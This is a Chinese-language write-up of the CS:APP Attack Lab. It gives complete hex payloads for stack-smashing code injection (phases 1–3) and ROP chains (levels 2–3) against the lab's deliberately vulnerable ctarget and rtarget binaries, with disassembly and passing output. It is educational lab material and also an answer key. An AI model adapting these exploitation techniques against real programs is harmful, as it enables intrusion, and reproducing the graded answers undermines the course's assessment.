# CSAPP Attacklab


# CSAPP-Attacklab

程序在一系列的初始化之后，会进入test

<!-- more -->

## phase_1

```assembly
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
```

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq
```

```assembly
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

覆盖返回地址，使程序进入`touch1`。`getbuf`的栈长度为`0x28`，`Gets`的第一个参数正好在栈上。所以，先输入`0x28`字节的`padding`，然后覆盖返回地址为`touch1`的地址。

答案(必须是hex)：

```text
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

```shell
niebelungen@ubuntu:~/Desktop/target1$ ./hex2raw < test.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
```

## phase_2

```assembly
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
```

我们的任务是重新调用`touch2`，输入函数依然是`getbuf`。`touch2`函数中有一个参数且这个参数必须等于cookie值。所以我们在调用`touch2`之前要先将cookie放入rdi。将我们注入的代码写到栈上，然后调用设置rdi，最后返回`touch2`。

所以注入代码为：`mov 0x59b997fa,rdi;ret; `，栈布局：

```text
|mov 0x59b997fa,rdi	|
|ret	touch2		|
|padding			|
|shellcode_addr		|
```
查看`getbuf`处的rsp：
```shell
pwndbg> info r rsp
rsp            0x5561dc78          0x5561dc78
```
这里的rsp其实是`Gets`栈底，所以答案为：

```text
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

```shell
niebelungen@ubuntu:~/Desktop/target1$ ./hex2raw < test.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
```

## phase_3

```c
void touch3(char *sval){
    vlevel=3;
    if(hexmatch(cookie,sval)){
        printf("Touch3!: You called touch3(\"%s\")\n",sval);
        validate(3);
    }else{
        printf("Misfire: You called touch3(\"%s\")\n",sval);
        fail(3);
    }
    exit(0);
}
int hexmatch(unsigned val,char *sval){
    char cbuf[110];
    char *s = cbuf+random()%100;
    sprintf(s,"%.8x",val);
    return strncmp(sval,s,9) == 0;
}
```

这里我们需要调用`touch3`，需要将存放cookie字符串的地址作为参数。我们将字符串写在栈上，然后将地址放入rdi，然后调用`touch3`。cookie转为ASCII字符：

```shell
pwndbg> print /x "59b997fa"
$1 = {0x35, 0x39, 0x62, 0x39, 0x39, 0x37, 0x66, 0x61, 0x0}
```

栈的结构：

```text
|mov cookie_addr,rdi|
|ret	touch3		|
|padding			|
|shellcode_addr		|
|cookie				|	
```

答案：

```text
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

```shell
niebelungen@ubuntu:~/Desktop/target1$ ./hex2raw < test.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61
```

## ROP-Level2

使用gadget完成level2。gadget限定了范围：0x401994-0x401ab2

```assembly
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq  
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3  
```

这里89 c7 90 c3==>`mov rdi,rax;nop;ret`，下面的58 90 c3\==>`pop rax;nop;ret`

这两个gadget可以让我们控制rdi的值。

```text
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
ab 19 40 00 00 00 00 00 /*pop rax ; nop ; ret*/
fa 97 b9 59 00 00 00 00 /*cookie*/
c5 19 40 00 00 00 00 00 /*mov rdi, rax ; nop ;ret*/
ec 17 40 00 00 00 00 00 /*touch2*/
```

```shell
niebelungen@ubuntu:~/Desktop/target1$ ./hex2raw < test.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

## ROP-Level3

使用gadget完成level3。

我们要想办法将字符串地址传入rdi中。但是在rtarget中，栈地址随机化。所以我们无法想之前那样直接传入栈地址。那么我们需要取得rsp的值。并可以对它做计算

```assembly
0x0000000000401a06 : mov rax, rsp ; ret
0x00000000004019a2 : mov rdi, rax ; ret
0x00000000004019ab : pop rax ; nop ; ret
0x00000000004019d6 : lea rax, [rdi + rsi] ; ret
0x0000000000401a13 : mov esi, ecx ; nop ; nop ; ret
0x0000000000401a69 : mov ecx, edx ; or bl, bl ; ret
0x00000000004019dd : mov edx, eax ; nop ; ret
```

`mov rax, rsp ; ret; mov rdi, rax ; ret`，取得rsp,并将其存入rdi。

`pop rax ; nop ; ret`控制rax的值。

`mov edx, eax ; nop ; ret ; mov ecx, edx ; or bl, bl ; ret ; mov esi, ecx ; nop ; nop ; ret`，控制了rsi的值。

`lea rax, [rdi + rsi] ; ret ; mov rdi, rax ; ret`，将rdi中的值加上rsi中的偏移，又放入rdi。

```text
|padding			|
|0x0000000000401a06	|
|0x00000000004019a2	|
|0x00000000004019ab	|
|offset				|
|0x00000000004019dd	|
|0x0000000000401a69	|
|0x0000000000401a13	|
|0x00000000004019d6	|
|0x00000000004019a2	|
|touch3				|
|cookie				|
```

```text
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
06 1a 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
ab 19 40 00 00 00 00 00 
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00 
69 1a 40 00 00 00 00 00 
13 1a 40 00 00 00 00 00 
d6 19 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
```

```shell
niebelungen@ubuntu:~/Desktop/target1$ ./hex2raw < test.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 69 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 
```

